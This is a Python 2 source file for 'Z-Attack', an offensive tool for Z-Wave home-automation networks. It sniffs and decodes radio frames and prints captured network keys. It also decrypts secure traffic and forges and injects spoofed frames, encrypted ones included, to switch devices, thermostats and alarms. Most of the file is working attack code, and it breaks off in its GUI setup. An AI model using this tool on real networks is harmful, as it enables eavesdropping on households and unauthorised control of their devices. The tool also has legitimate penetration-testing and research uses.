import pydot
import datetime
from re import split, sub
from Crypto.Cipher import AES
from sys import argv
from xml.dom.minidom import parse
from serial import Serial, EIGHTBITS, PARITY_NONE, STOPBITS_ONE
from Tkinter import *
from PIL import ImageTk, Image

try:
    from rflib import RfCat as rfcat
except ImportError:
    print "Error : rflib not installed, RFCat will not work\n"
else:
    from rflib import SYNCM_CARRIER_15_of_16, MOD_2FSK, ChipconUsbTimeoutException

# Import external files
import zwClasses
import sendData

version = "0.1.1"
debug = 0
nonce = ""
nonce_other = "000"
frame_nb = 0
key = "0102030405060708090A0B0C0D0E0F10"  # OpenZWave default key
zwave_dic = dict()


def checksum(data):
    b = 255
    for i in range(2, len(data)):
        b ^= int(data[i].encode("hex"), 16)
    print "\t-> Checksum :", format(b, '02x')
    return format(b, '02x').decode("hex")


def sending_mode():
    print ""
    print str(datetime.datetime.now())

    if deviceData == 2:
        print("[*] Opening serial port")
        try:
            serial_send = Serial(port=scom,
                                 baudrate=115000,
                                 bytesize=EIGHTBITS,
                                 parity=PARITY_NONE,
                                 stopbits=STOPBITS_ONE,
                                 timeout=1)
        except:
            print "Error while sending data to " + scom

    print("[*] Writing in progress")
    print "[*] Sending data to network :", homeID_userInput.get()
    print "\t-> DstNode :", dst_node_userInput.get()
    print "\t-> src_node :", src_node_userInput.get()

    zclass = Zclass_userInput.get()

    # Header (Preambule + Start of Frame Delimiter)
    d_init = "\x00\x0E"

    # homeID 4 bytes
    d_home_id = homeID_userInput.get().decode("hex")
    # srcNode 1 byte
    d_src_node = src_node_userInput.get().decode("hex")
    # d_header = "\x41\x01"
    d_header = "\x41\x01"
    # dstNode 1 byte
    d_dst_node = dst_node_userInput.get().decode("hex")

    d_payload = zclass
    print "\t-> Payload :", d_payload
    d_payload = d_payload.decode("hex")

    if valueCheckbtn_Secure.get():
        print "[*] Sending secure frame"
        d_payload_encrypted = generate_encrypted_payload(d_src_node, d_dst_node, d_payload)
        print "\t-> Full Encoded Payload :", d_payload_encrypted.encode('hex')

        d_length = len(d_payload_encrypted) + len(d_home_id) + len(d_header) + 4
        d_length = format(d_length, '02x')
        print "\t-> Length :", d_length
        d_length = d_length.decode("hex")

        d_checksum = checksum(d_init + d_home_id + d_src_node + d_header + d_length + d_dst_node + d_payload_encrypted)
        if deviceData == 2:
            serial_send.write(d_init + d_home_id + d_src_node + d_header + d_length + d_dst_node + \
                              d_payload_encrypted + d_checksum)
            serial_send.close()
        else:
            data = d_home_id + d_src_node + d_header + d_length + d_dst_node + d_payload_encrypted + d_checksum
            print "\t-> DATA :", data.encode("hex")
            d.RFxmit(invert(data))
        print("[*] Done")
    else:
        print "[*] Sending unsecure frame"
        d_length = len(d_payload) + len(d_home_id) + len(d_header) + 4
        d_length = format(d_length, '02x')
        print "\t-> Length :", d_length
        d_length = d_length.decode("hex")

        # Checksum
        # Don't know why I need d_init for the checksum
        d_checksum = checksum(d_init + d_home_id + d_src_node + d_header + d_length + d_dst_node + d_payload)

        if deviceData == 2:
            serial_send.write(d_init + d_home_id + d_src_node + d_header + d_length + d_dst_node + d_payload + \
                              d_checksum)
            serial_send.close()
        else:
            data = d_home_id + d_src_node + d_header + d_length + d_dst_node + d_payload + d_checksum
            print "\t-> DATA :", data.encode("hex")
            d.RFxmit(invert(data))
        print("[*] Done")


def sending_raw_mode(payload):
    # Header (Preambule + Start of Frame Delimiter)
    d_init = "\x00\x0E"
    d_header = "\x41\x01"

    if listboxMainHomeID.size() == 1:
        i = (0,)
    else:
        i = listboxMainHomeID.curselection()

    d_home_id = listboxMainHomeID.get(i)
    d_home_id = d_home_id.decode("hex")

    d_payload = payload

    if deviceData == 2:
        print("[*] Opening serial port")
        try:
            serial_send = Serial(port=scom,
                                 baudrate=115000,
                                 bytesize=EIGHTBITS,
                                 parity=PARITY_NONE,
                                 stopbits=STOPBITS_ONE,
                                 timeout=1)
        except:
            print "Error while sending data to " + scom

    print "[*] Writing in progress"
    print "[*] Sending data to network :", d_home_id.encode("hex")
    # Checksum
    d_checksum = checksum(d_init + d_home_id + d_payload)

    if deviceData == 2:
        serial_send.write(d_init + d_home_id + d_payload + d_checksum)
        serial_send.close()
    else:
        data = d_home_id + d_payload + d_checksum
        print "\t-> DATA :", data.encode("hex")
        d.RFxmit(invert(data))
    print("[*] Done")


def key_encryption(key, default_static_key):
    temp_key = key.decode("hex")
    cipher = AES.new(temp_key, AES.MODE_ECB)
    return cipher.encrypt(default_static_key).encode('hex')


def generate_encrypt_key(key):
    # Default static key for encryption
    default_static_key = b'\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa'
    return key_encryption(key, default_static_key)


def generate_mac_key(key):
    # Default static key for authentication
    default_static_key = b'\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55'
    return key_encryption(key, default_static_key)


def generate_encrypted_payload(s_node, d_node, payload_to_encrypt):
    # We first need to ask a nonce from the device
    # That's gonna be a tough one (asynchronous mode :-/), so ask to the user
    nonce_remote_device = Nonce_userInput.get()  # SecurityCmd_NonceGet

    cc_msg_encap = "\x98\x81"  # SecurityCmd_MessageEncap
    sequence = "\x81"  # Sequence number : Encrypted data
    nonce = "aaaaaaaaaaaaaaaa"  # Static nonce and we don't care, we are the bad guy here :-)
    nonce_id = nonce_remote_device[:2]
    print "\t-> nonce_id :", nonce_id

    iv = nonce + nonce_remote_device

    payload_to_encrypt = "\x00" + payload_to_encrypt  # Sequence + payload to encrypt

    payload_to_encrypt = payload_to_encrypt.encode("hex")
    print "\t-> Payload to encrypt :", payload_to_encrypt
    print "\t-> IV :", iv
    iv = iv.decode("hex")

    # Padding 16 bytes msg
    padding = ""
    length_payload = len(payload_to_encrypt)/2
    print "\t-> length_payload :", length_payload
    padding_length = 32 - (length_payload * 2)
    for pad in range(0, padding_length):
        padding += "0"
    payload_to_encrypt = str(payload_to_encrypt) + padding
    print "\t-> Payload with padding :", payload_to_encrypt

    payload_to_encrypt = payload_to_encrypt.decode("hex")

    # Generate Encoded Payload
    encrypt_key = generate_encrypt_key(key).decode("hex")
    print "\t-> encrypt_key :", encrypt_key.encode("hex")
    cipher = AES.new(encrypt_key, AES.MODE_OFB, iv)
    encoded_payload = cipher.encrypt(payload_to_encrypt)
    print "\t-> encoded_payload :", encoded_payload.encode("hex")

    # Split payload to initial length
    encoded_payload = encoded_payload[:length_payload]
    print "\t-> encoded_payload (split) :", encoded_payload.encode("hex")

    print "\t-> s_node :", s_node.encode("hex")
    print "\t-> d_node :", d_node.encode("hex")

    # Generate MAC Payload to encrypt with MAC key
    authentication_raw = sequence.encode("hex") + s_node.encode("hex") + d_node.encode("hex") + \
                         ("%0.2X" % length_payload) + encoded_payload.encode("hex")
    print "\t-> MAC Raw :", authentication_raw

    # Generate MAC key (ECB)
    authentication_key = generate_mac_key(key).decode("hex")
    print "\t-> MAC_key :", authentication_key.encode("hex")

    # Encrypt IV with ECB
    cipher = AES.new(authentication_key, AES.MODE_ECB)
    temp_auth = cipher.encrypt(iv)
    print "\t-> Encoded IV :", temp_auth.encode('hex')

    # Padding 16 bytes msg for MAC
    padding = ""
    length_mac = len(authentication_raw) / 2
    padding_length = 32 - (length_mac*2)
    for pad in range(0, padding_length):
        padding += "0"
    authentication_raw = str(authentication_raw) + padding
    print "\t-> MAC with padding :", authentication_raw

    # XOR with encrypted IV
    l1 = int(authentication_raw, 16)
    l2 = int(temp_auth.encode('hex'), 16)
    xored = format(l1 ^ l2, 'x')
    print "\t-> XOR MAC :", xored
    if len(xored) != 32:
        xored = "0" + xored
    print "\t-> XOR MAC (16 bytes) :", xored

    # Encrypt MAC ECB
    xored = xored.decode("hex")
    cipher = AES.new(authentication_key, AES.MODE_ECB)
    encodedMAC = cipher.encrypt(xored)
    print "\t-> Encoded MAC :", encodedMAC.encode('hex')

    # Split MAC to 8 bytes
    encodedMAC = encodedMAC[:8]
    print "\t-> Encoded MAC (split) :", encodedMAC.encode("hex")

    EncodedFrame = cc_msg_encap + nonce.decode("hex") + encoded_payload + nonce_id.decode("hex") + encodedMAC

    return EncodedFrame


def decrypt(payload_enc, nonce_other, nonce_device, payload, length_encrypted_payload):
    global key
    result = ""
    if len(key) == 32:
        encrypt_key = generate_encrypt_key(key)
        key_aes = encrypt_key.decode("hex")
        if nonce_device and nonce_other:
            iv = nonce_device + nonce_other

            # Padding 16 bytes msg
            padding = ""
            # Encrypted Packet Size is:
            # Packet Length - Device Nonce(8) - Reciever Nonce ID (1) - Mac (8) - CommandClass - Command
            if 16 < length_encrypted_payload < 32:  # More than 1 block to decrypt
                if debug:
                    print "\t\t\t[2 BLOCKS CIPHER TO DECRYPT] (hex):"

                payload_enc_block1 = payload_enc[0:32]
                payload_enc_block2 = payload_enc[32:]
                print payload_enc_block1
                print payload_enc_block2
                length_payload_enc_block2 = len(payload_enc_block2) / 2
                padding_length = 32 - (length_payload_enc_block2 * 2)
                # 16 => Device Nonce(8) - 4 bytes CC / Command - 4 bytes CC - 8 length MAC authentication
                for pad in range(0, padding_length):
                    padding += "0"
                payload_enc_block2 = str(payload_enc_block2) + padding

                if debug:
                    print "\t\t\t[MSG TO DECODE] (hex):" + payload_enc
                payload_enc_block1 = payload_enc_block1.decode("hex")
                payload_enc_block2 = payload_enc_block2.decode("hex")

                try:
                    iv = iv.decode("hex")
                    print "\t\t\t[IV] (hex) : " + iv.encode('hex')

                    cipher = AES.new(key_aes, AES.MODE_OFB, iv)
                    result1 = cipher.decrypt(payload_enc_block1).encode('hex')
                    result2 = cipher.decrypt(payload_enc_block2).encode('hex')
                    result = result1+result2
                    print "\t\t\t[DECODED] Payload (hex): " + result
                except:
                    print "Error during decrypting"
            else:
                padding_length = 32 - (length_encrypted_payload*2)
                # 16 => Device Nonce(8) - 4 bytes CC /Command - 4 bytes CC  - 8 length MAC authentication
                for pad in range(0, padding_length):
                    padding += "0"
                payload_enc = str(payload_enc) + padding
                if debug:
                    print "\t\t\t[MSG TO DECODE] (hex):" + payload_enc
                payload_enc = payload_enc.decode("hex")

                try:
                    iv = iv.decode("hex")
                    print "\t\t\t[IV] (hex) : " + iv.encode('hex')
                    cipher = AES.new(key_aes, AES.MODE_OFB, iv)
                    result = cipher.decrypt(payload_enc).encode('hex')
                    print "\t\t\t[DECODED] Payload (hex): " + result
                except:
                    print "Error during decrypting"
    else:
        print "\t\t\t[DEBUG] Error with network key"
        result = ""
    return result[2:]


def zclass_finder(payload, home_id, src_node):
    # Payload analysis
    global nonce_other
    ZwClass = payload[0:2]

    param = cc = cmd = mapManufacturer = ''

    if ZwClass in zwClasses.ZwaveClass.keys():
        print "\t\tCommandClass=", zwClasses.ZwaveClass[ZwClass]['name']
        CmdClass = payload[2:4]
        cc = zwClasses.ZwaveClass[ZwClass]['name']
        if CmdClass in zwClasses.ZwaveClass[ZwClass].keys():
            print "\t\tCommand=", zwClasses.ZwaveClass[ZwClass][CmdClass]
            cmd = zwClasses.ZwaveClass[ZwClass][CmdClass]

            param = cc + "|" + cmd + "("

            if zwClasses.ZwaveClass[ZwClass][CmdClass] == "SecurityCmd_MessageEncap":
                length_encrypted_payload = (len(payload)/2) - 8 - 2 - 8  # MAC(8bytes)  + CC + C + nonce(8bytes)
                if debug:
                    print "\t\t[DEBUG][length_encrypted_payload] :" + str(length_encrypted_payload)+" bytes"
                nonce_device = payload[4:20]
                payload_enc=payload[20:length_encrypted_payload*2+20]
                auth_enc = payload[-16:]
                if debug:
                    print "\t\t[DEBUG][Nonce]=" + nonce_device + "\t[Encrypted payload]=" + payload_enc + \
                          "\t[Authentication MAC]=" + auth_enc
                if nonce_other:
                    payloadDecoded = decrypt(payload_enc, nonce_other, nonce_device, payload, length_encrypted_payload)
                    payload = payloadDecoded
                    try:
                        if debug:
                            "\t\t[DEBUG] payloadDecoded " + payloadDecoded
                        # Change CmdClass and ZwClass to the unencrypted one
                        ZwClass = payloadDecoded[0:2]
                        CmdClass = payloadDecoded[2:4]
                        cc = zwClasses.ZwaveClass[ZwClass]['name']
                        cmd = zwClasses.ZwaveClass[ZwClass][CmdClass]
                        param += cc+"|"+cmd+"("
                    except:
                        print "\t\t[Error during decrypting data]"
                        return
                else:
                    print "\t\t[DEBUG] Unable to decrypt - no device nounce"

            if zwClasses.ZwaveClass[ZwClass][CmdClass] == "ManufacturerSpecificCmd_Report":
                manufacturer = payload[4:8]
                product = payload[8:12]

                # Parse XML file to find manufacturer
                xmldoc = parse('manufacturer_specific.xml')
                manufacturers_xml = xmldoc.getElementsByTagName('Manufacturer')
                for s in manufacturers_xml:
                    if manufacturer == s.attributes['id'].value:
                        manufacturer = s.attributes['name'].value
                        products_xml = s.getElementsByTagName('Product')
                        for product_xml in products_xml:
                            if product == product_xml.attributes['type'].value:
                                product = product_xml.attributes['name'].value
                print "\t\tManufacturer=" + manufacturer + "\t\tProduct=" + product
                param += "Manufacturer=" + manufacturer + "|Product=" + product
                mapManufacturer = "Manufacturer=" + manufacturer + "|Product=" + product

                for i in range(len(zwave_dic[home_id])):
                    if src_node in zwave_dic[home_id][i]:
                        zwave_dic[home_id][i] = [src_node, manufacturer + " | " + product]

            elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "SecurityCmd_NonceReport":
                nonce_other = payload[4:20]
                if debug:
                    print "\t\t[DEBUG][GET Nonce] :" + nonce_other
                param += nonce_other

            elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "VersionCmd_Report":
                lib = payload[4:6]
                protocol_hex = payload[6:10]
                application_hex = payload[10:14]

                lib = str(int(lib, 16))
                if lib in zwClasses.LIBRARY.keys():
                    lib = zwClasses.LIBRARY[lib]

                protocol = str(int(protocol_hex[:2], 16)) + "." + str(int(protocol_hex[2:4], 16))
                application = str(int(application_hex[:2], 16)) + "." + str(int(application_hex[2:4], 16))

                print "\t\tlibrary=" + lib + "\tprotocol=" + protocol + "\tapplication=" + application
                param += "library=" + lib + "|protocol=" + protocol + "|application=" + application

            elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "BatteryCmd_Report":
                param1 = payload[4:6]
                if param1 == "ff":
                    print "\t\tParam[1]= (Battery = 0)"
                    param += "Battery = 0"
                else:
                    print "\t\tParam[1]= (Battery = " + str(int(param1, 16)) + ")"
                    param += "Battery = " + str(int(param1, 16))

            elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "SwitchBinaryCmd_Set" or \
                    zwClasses.ZwaveClass[ZwClass][CmdClass] == "SwitchBinaryCmd_Report" or \
                    zwClasses.ZwaveClass[ZwClass][CmdClass] == "BasicCmd_Report" or \
                    zwClasses.ZwaveClass[ZwClass][CmdClass] == "BasicCmd_Set" or \
                    zwClasses.ZwaveClass[ZwClass][CmdClass] == "SensorBinaryCmd_Report" or \
                    zwClasses.ZwaveClass[ZwClass][CmdClass] == "SwitchMultilevelCmd_Report":
                param1 = payload[4:6]
                if param1 == "ff":
                    print "\t\tParam[1]= On"
                    param += "On"
                if param1 == "00":
                    print "\t\tParam[1]= Off"
                    param += "Off"

            elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "SecurityCmd_NetworkKeySet":
                key = payload[4:36]
                print "\t\t\t[NETWORK KEY] (hex) : " + key
                param += key

            elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "MeterCmd_Report":
                val = payload[12:16]
                param += str(int(val, 16)/1000) + " Watts"

            elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "SensorAlarmCmd_Report":
                param1 = payload[4:6]
                if param1 == "00":
                    print "\t\tParam[1]= General Purpose Alarm"
                    param += "General Purpose Alarm"
                elif param1 == "01":
                    print "\t\tParam[1]= Smoke Alarm"
                    param += "Smoke Alarm"
                elif param1 == "02":
                    print "\t\tParam[1]= CO Alarm"
                    param += "CO Alarm"
                elif param1 == "03":
                    print "\t\tParam[1]= CO2 Alarm"
                    param += "CO2 Alarm"
                elif param1 == "04":
                    print "\t\tParam[1]= Heat Alarm"
                    param += "Heat Alarm"
                elif param1 == "05":
                    print "\t\tParam[1]= Water Leak Alarm"
                    param += "Water Leak Alarm"

            elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "PowerlevelCmd_Report":
                param1 = payload[4:6]
                if param1 == "00":
                    print "\t\tParam[1]= Normal"
                    param += "Normal"
                elif param1 == "01":
                    print "\t\tParam[1]= -1dB"
                    param += "-1dB"
                elif param1 == "02":
                    print "\t\tParam[1]= -2dB"
                    param += "-2dB"
                elif param1 == "03":
                    print "\t\tParam[1]= -3dB"
                    param += "-3dB"
                elif param1 == "04":
                    print "\t\tParam[1]= -4dB"
                    param += "-4dB"
                elif param1 == "05":
                    print "\t\tParam[1]= -5dB"
                    param += "-5dB"
                elif param1 == "06":
                    print "\t\tParam[1]= -6dB"
                    param += "-6dB"
                elif param1 == "07":
                    print "\t\tParam[1]= -7dB"
                    param += "-7dB"
                elif param1 == "08":
                    print "\t\tParam[1]= -8dB"
                    param += "-8dB"
                elif param1 == "09":
                    print "\t\tParam[1]= -9dB"
                    param += "-9dB"

            elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "ThermostatModeCmd_Report":
                param1 = payload[4:6]
                if param1 == "00":
                    print "\t\tParam[1]= Off"
                    param += "Off"
                elif param1 == "01":
                    print "\t\tParam[1]= Heat"
                    param += "Heat"
                elif param1 == "02":
                    print "\t\tParam[1]= Cool"
                    param += "Cool"
                elif param1 == "03":
                    print "\t\tParam[1]= Auto"
                    param += "Auto"
                elif param1 == "04":
                    print "\t\tParam[1]= Auxiliary/Emergency Heat"
                    param += "Auxiliary/Emergency Heat"
                elif param1 == "05":
                    print "\t\tParam[1]= Resume"
                    param += "Resume"
                elif param1 == "06":
                    print "\t\tParam[1]= Fan Only"
                    param += "Fan Only"
                elif param1 == "07":
                    print "\t\tParam[1]= Furnace"
                    param += "Furnace"
                elif param1 == "08":
                    print "\t\tParam[1]= Dry Air"
                    param += "Dry Air"
                elif param1 == "09":
                    print "\t\tParam[1]= Moist Air"
                    param += "Moist Air"
                elif param1 == "10":
                    print "\t\tParam[1]= Auto Changeover"
                    param += "Auto Changeover"
                elif param1 == "11":
                    print "\t\tParam[1]= Energy Save Heat"
                    param += "Energy Save Heat"
                elif param1 == "12":
                    print "\t\tParam[1]= Energy Save Cool"
                    param += "Energy Save Cool"
                elif param1 == "13":
                    print "\t\tParam[1]= AWAY"
                    param += "AWAY"

            elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "ProtectionCmd_Report":
                param1 = payload[4:6]
                if param1 == "00":
                    print "\t\tParam[1]= Unprotected"
                    param += "Unprotected"
                elif param1 == "01":
                    print "\t\tParam[1]= Protection by sequence"
                    param += "Protection by sequence"
                elif param1 == "02":
                    print "\t\tParam[1]= No operation possible"
                    param += "No operation possible"

            elif zwClasses.ZwaveClass[ZwClass][CmdClass] == "SwitchAllCmd_Report":
                param1 = payload[4:6]
                if param1 == "00":
                    print "\t\tParam[1]= Excluded from the all on/all off functionality"
                    param += "Excluded from the all on/all off functionality"
                elif param1 == "01":
                    print "\t\tParam[1]= Excluded from the all on functionality but not all off"
                    param += "Excluded from the all on functionality but not all off"
                elif param1 == "02":
                    print "\t\tParam[1]= Excluded from the all off functionality but not all on"
                    param += "Excluded from the all off functionality but not all on"
                elif param1 == "ff":
                    print "\t\tParam[1]= Included in the all on/all off functionality"
                    param += "Included in the all on/all off functionality"

            param += ")"
    else:
        param = "UNKNOWN"
    return param


def invert(data):
    datapost = ''
    for i in range(len(data)):
        datapost += chr(ord(data[i]) ^ 0xFF)
    return datapost


def calculate_checksum(data):
    checksum = 0xff
    for i in range(len(data)):
        checksum ^= ord(data[i])
    return checksum


def listening_mode():
        global frame_nb
        payload = ""
        res = ""

        # TI Dev KIT
        if deviceData == 2:
            bytes_to_read = serialListen.inWaiting()
            res = serialListen.read(bytes_to_read)
            res = res[2:]
        # Retrieve data from RFCat
        else:
            try:
                # RFCat
                res = d.RFrecv(10)[0]
                # Invert frame for 40Mhz Bandwith - cf BH 2013 (sensepost)
                res = invert(res)
            except ChipconUsbTimeoutException:
                pass

        if res:
            print ""
            print str(datetime.datetime.now())
            if debug:
                print "\t[DEBUG data received] " + res.encode("hex")

            # Check is several frames in one
            frames = split("\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\xf0", res)

            if debug:
                print "\t[Number of frames] " + str(len(frames))

            for frame in frames:
                res = frame
                print ""
                if debug:
                    print '\t[DEBUG Frame] ' + res.encode("hex")

                # Control the length of the frame
                try:
                    length = ord(res[7])
                    res = res[0:length]
                    # Check CRC and remove noise
                    fcs = res[-1]
                    res = res[:-1]  # Remove FCS
                    calculated_checksum_frame = calculate_checksum(res)
                    if calculated_checksum_frame != ord(fcs):
                        print "\tChecksum: ", fcs.encode("hex"), "(Incorrect)"
                        res = ""
                except:
                    # Problem during Checksum process (frame too short?)
                    print "\t[Error during FCS calc : Dropped]"
                    print "\t[Frame] " + res

                if res:  # if we still have a frame to decode
                    res = res.encode("hex")

                    # PATCH REMOVE UNUSEFUL DATA (Do not know why :-))
                    res = sub(r'00[0-1][0-1][0-1][a-f0-9]', '', res)
                    res = sub(r'2[a-f0-9]00fa[a-f0-9][a-f0-9][a-f0-9][a-f0-9]00000', '', res)
                    res = sub(r'2[a-f0-9]00fa[a-f0-9][a-f0-9][a-f0-9][a-f0-9]', '', res)

                    # Decode Zwave frame
                    home_id = res[0:8]
                    src_node = res[8:10]
                    FrameControl = res[10:14]
                    length = res[14:16]
                    dst_node = res[16:18]
                    payload = res[18:]

                    if length == "0a":  # ACK frame is a 0 byte payload => 0A cf G.9959
                        print "\tACK response from " + src_node + " to "+dst_node
                        decoded_payload = "ACK"

                    if 0 < len(payload) < 128:  # Payload for Z-Wave 64 bytes max
                        print "\tZ-Wave frame:"
                        print "\t\tHomeID=", home_id
                        print "\t\tSrcNode=", src_node
                        print "\t\tDstNode=", dst_node
                        print "\t\tChecksum=", fcs.encode("hex")

                        if dst_node == "ff":
                            print "\t\t[*] Broadcast frame"

                        # Generate a list of home_id and Nodes
                        if home_id in zwave_dic.keys():
                            if src_node:
                                tt = 0
                                for i in range(len(zwave_dic[home_id])):
                                    if src_node in zwave_dic[home_id][i]:
                                        tt = 1
                                if tt == 0:
                                    list_src_node = [src_node, '']
                                    zwave_dic[home_id].append(list_src_node)
                            if dst_node and dst_node != "ff":
                                tt = 0
                                for i in range(len(zwave_dic[home_id])):
                                    if dst_node in zwave_dic[home_id][i]:
                                        tt = 1
                                if tt == 0:
                                    list_dst_node = [dst_node, '']
                                    zwave_dic[home_id].append(list_dst_node)
                        else:
                            if src_node:
                                list_src_node = [[src_node, '']]
                                zwave_dic[home_id] = list_src_node
                            if dst_node and dst_node != "ff" and dst_node != src_node:
                                list_dst_node = [dst_node, '']
                                zwave_dic[home_id].append(list_dst_node)

                            listboxMainHomeID.delete(0, END)
                            for id in zwave_dic.keys():
                                listboxMainHomeID.insert(END, id)

                        decoded_payload = zclass_finder(payload, home_id, src_node)
                    if decoded_payload:
                        # Count frame number
                        frame_nb += 1

                        # Write output to user
                        log.insert(END, "\n" + str(frame_nb) + " | " + str(datetime.datetime.now()) + " | " + home_id + " | " + src_node + " | " + dst_node + " | " + decoded_payload)
                        log.insert(END, "\n-----------------------------------------------------------------------------------------------------------------------------------------------------")
                        # Auto scroll to the end of the text if user don't use the scrollbar
                        if scrollb.get()[1] == 1.0:
                            log.yview(END)

                        # Write output to file
                        if fOutput:
                            fOutputCSV = open("output/result.txt", "a")
                            fOutputCSV.write("\n" + str(frame_nb) + " | " + str(datetime.datetime.now()) + " | " + home_id + " | " + src_node + " | " + dst_node + " | " + decoded_payload + " | " + payload)
                            fOutputCSV.close()

                        if debug and decoded_payload != "ACK":
                            print "\t[DEBUG] Payload=", payload

        root.after(1, listening_mode)  # Loop


def window_send_advanced_select_home_id(evt):
    i = listBoxSelectHomeID.curselection()
    try:
        HomeId_auto.set(listBoxSelectHomeID.get(i))
    except TclError:
        pass
    else:
        listBoxSelectSrc.delete(1, END)
        listBoxSelectDst.delete(1, END)

        for j in range(len(zwave_dic[listBoxSelectHomeID.get(i)])):
            listBoxSelectSrc.insert(END, zwave_dic[listBoxSelectHomeID.get(i)][j][0])
            listBoxSelectDst.insert(END, zwave_dic[listBoxSelectHomeID.get(i)][j][0])


def window_send_advanced_select_src(evt):
    i = listBoxSelectSrc.curselection()
    try:
        Src_auto.set(listBoxSelectSrc.get(i))
    except TclError:
        pass


def window_send_advanced_select_dst(evt):
    i = listBoxSelectDst.curselection()
    try:
        Dst_auto.set(listBoxSelectDst.get(i))
    except TclError:
        pass


def window_send_advanced_select_cc(evt):
    i = listBoxSelectCC.curselection()
    Zclass_auto.set(sendData.CmdClassToSend[listBoxSelectCC.get(i)].encode("hex"))


def window_about():
    w_about = Toplevel()
    w_about.wm_title("About")
    w_about.resizable(width=FALSE, height=FALSE)
    frame = Frame(w_about, width=200, height=50)
    frame.grid(row=0, column=1, padx=2, pady=2)
    img = ImageTk.PhotoImage(Image.open("images/zattack.png"))
    panel = Label(frame, image=img)
    panel.image = img  # Workaround to counter garbage collection
    panel.grid(row=0, column=0, padx=2, pady=2)
    Label(frame, text="Z-Attack " + version).grid(row=1, column=0, padx=10, pady=2)
    Label(frame, text="Author: Advens").grid(row=2, column=0, padx=10, pady=2)


def window_send_advanced():
    global valueCheckbtn_Secure, listBoxSelectHomeID, listBoxSelectSrc, listBoxSelectDst, listBoxSelectCC, \
        HomeId_auto, Dst_auto, Src_auto, Zclass_auto, homeID_userInput, dst_node_userInput, src_node_userInput, \
        Zclass_userInput, Nonce_userInput
    w_send = Toplevel()
    w_send.wm_title("Z-Attack - Send Z-Wave frame (Advanced mode)")
    w_send.resizable(width=False, height=False)

    rightFrame = Frame(w_send, width=200, height=600)
    rightFrame.grid(row=0, column=1, padx=0, pady=0)
    Label(rightFrame, text="Emission:").grid(row=0, column=0, padx=10, pady=2)

    HomeId_auto = StringVar()
    Label(rightFrame, text="HomeID:").grid(row=1, column=0, padx=10, pady=2)
    homeID_userInput = Entry(rightFrame, width=10, textvariable=HomeId_auto)
    homeID_userInput.grid(row=1, column=1, padx=10, pady=2)

    Src_auto = StringVar()
    Label(rightFrame, text="SrcNode:").grid(row=2, column=0, padx=10, pady=2)
    src_node_userInput = Entry(rightFrame, width=10, textvariable=Src_auto)
    src_node_userInput.grid(row=2, column=1, padx=10, pady=2)

    Dst_auto = StringVar()
    Label(rightFrame, text="DstNode:").grid(row=3, column=0, padx=10, pady=2)
    dst_node_userInput = Entry(rightFrame, width=10, textvariable=Dst_auto)
    dst_node_userInput.grid(row=3, column=1, padx=10, pady=2)

    Zclass_auto = StringVar()
    Label(rightFrame, text="Zclass:").grid(row=4, column=0, padx=10, pady=2)
    Zclass_userInput = Entry(rightFrame, width=20, textvariable=Zclass_auto)
    Zclass_userInput.grid(row=4, column=1, padx=10, pady=2)

    Nounce_auto = StringVar()
    Label(rightFrame, text="Nonce:").grid(row=5, column=0, padx=10, pady=2)
    Nonce_userInput = Entry(rightFrame, width=20, textvariable=Nounce_auto)
    Nonce_userInput.grid(row=5, column=1, padx=10, pady=2)

    # Secure frame
    valueCheckbtn_Secure = IntVar()
    checkbuttonSecure = Checkbutton(rightFrame, text="Secure (Nonce required)",
                                    variable=valueCheckbtn_Secure).grid(row=6, column=1, padx=10, pady=2)

    buttonSend = Button(rightFrame, text="Send", command=sending_mode)
    buttonSend.grid(row=7, column=1, padx=20, pady=2)

    bottomFrame = Frame(w_send, width=200, height=600)
    bottomFrame.rowconfigure(1, weight=1)  # Make the listbox span across the whole row
    bottomFrame.grid(row=0, column=0, padx=0, pady=0, sticky='nsew')

    Label(bottomFrame, text="HomeID:").grid(row=0, column=0, padx=10, pady=2)
    listBoxSelectHomeID = Listbox(bottomFrame, selectmode=SINGLE)
    listBoxSelectHomeID.grid(row=1, column=0, padx=2, pady=2, sticky='nsew')
    listBoxSelectHomeID.bind('<ButtonRelease-1>', window_send_advanced_select_home_id)
    scrollbHomeID = Scrollbar(bottomFrame, command=listBoxSelectHomeID.yview)
    scrollbHomeID.grid(row=1, column=1, padx=0, pady=2, sticky='nsew')
    listBoxSelectHomeID['yscrollcommand'] = scrollbHomeID.set

    Label(bottomFrame, text="Src:").grid(row=0, column=2, padx=10, pady=2)
    listBoxSelectSrc = Listbox(bottomFrame, selectmode=SINGLE)
    listBoxSelectSrc.config(width=10)
    listBoxSelectSrc.grid(row=1, column=2, padx=2, pady=2, sticky='nsew')
    listBoxSelectSrc.bind('<ButtonRelease-1>', window_send_advanced_select_src)
    scrollbSrc = Scrollbar(bottomFrame, command=listBoxSelectSrc.yview)
    scrollbSrc.grid(row=1, column=3, padx=0, pady=2, sticky='nsew')
    listBoxSelectSrc['yscrollcommand'] = scrollbSrc.set
    listBoxSelectSrc.insert(END, "ff")

    Label(bottomFrame, text="Dst:").grid(row=0, column=4, padx=10, pady=2)
    listBoxSelectDst = Listbox(bottomFrame, selectmode=SINGLE)
    listBoxSelectDst.config(width=10)
    listBoxSelectDst.grid(row=1, column=4, padx=2, pady=2, sticky='nsew')
    listBoxSelectDst.bind('<ButtonRelease-1>', window_send_advanced_select_dst)
    scrollbDst = Scrollbar(bottomFrame, command=listBoxSelectDst.yview)
    scrollbDst.grid(row=1, column=5, padx=0, pady=2, sticky='nsew')
    listBoxSelectDst['yscrollcommand'] = scrollbDst.set
    listBoxSelectDst.insert(END, "ff")

    Label(bottomFrame, text="CC:").grid(row=0, column=6, padx=10, pady=2)
    listBoxSelectCC = Listbox(bottomFrame, selectmode=SINGLE)
    listBoxSelectCC.config(width=70)
    listBoxSelectCC.grid(row=1, column=6, padx=2, pady=2, sticky='nsew')
